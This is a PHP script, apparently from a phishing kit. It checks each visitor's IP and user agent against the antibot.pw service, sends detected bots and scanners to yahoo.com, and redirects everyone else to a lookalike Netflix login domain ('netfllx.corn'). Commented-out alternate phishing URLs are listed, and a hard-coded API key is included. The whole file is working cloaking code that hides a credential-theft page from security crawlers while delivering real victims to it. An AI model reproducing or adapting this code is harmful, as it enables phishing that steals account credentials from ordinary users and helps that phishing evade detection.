<?php 
error_reporting(0);
error_log(0);
session_start();

#######################################################################################################
$config_antibot['apikey']   = '2caa972a6b4e016d733745ae06cfe1d9'; //https://antibot.pw/developers
$config_antibot['bot']      = 'https://yahoo.com';
$link = array(
	//'https://logln-memberarea-authprofile.netfllx.corn.mutbluein.com/?member',
	//'https://logln-memberarea-authprofile.netfllx.corn.mutcolourin.com/?member',
	'https://logln-memberarea-authen.netfllx.corn.cikupola.com/?member'

);
$config_antibot['real']     = $link[array_rand($link)];
#######################################################################################################

class Antibot
{
    function apikey($api_key){
        $this->apikey = $api_key;
    }
    function get_client_ip()
	{
	    // Get real visitor IP behind CloudFlare network
	    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
	              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	    }
	    $client  = @$_SERVER['HTTP_CLIENT_IP'];
	    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	    $remote  = $_SERVER['REMOTE_ADDR'];
	
	    if(filter_var($client, FILTER_VALIDATE_IP))
	    {
	        $ip = $client;
	    }
	    elseif(filter_var($forward, FILTER_VALIDATE_IP))
	    {
	        $ip = $forward;
	    }
	    else
	    {
	        $ip = $remote;
	    }
	
	    return $ip;
	}
    function httpGet($url){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        return $response;
    }
    function check(){
        $ip         = $this->get_client_ip();
        $respons    = $this->httpGet("https://antibot.pw/api/v2-blockers?ip=".$ip."&apikey=".$this->apikey."&ua=".urlencode($_SERVER['HTTP_USER_AGENT']));
        $json       = json_decode($respons,true);
        if($json['is_bot'] == 1 || $json['is_bot'] == true){
            return true;
        }else{
            return false;
        }
    }
}
$Antibot = new Antibot;
$Antibot->apikey( $config_antibot['apikey'] );
if($Antibot->check() == true){
    die(header("location: ".$config_antibot['bot']));
}else{
    die(header("location: ".$config_antibot['real']));
}
?>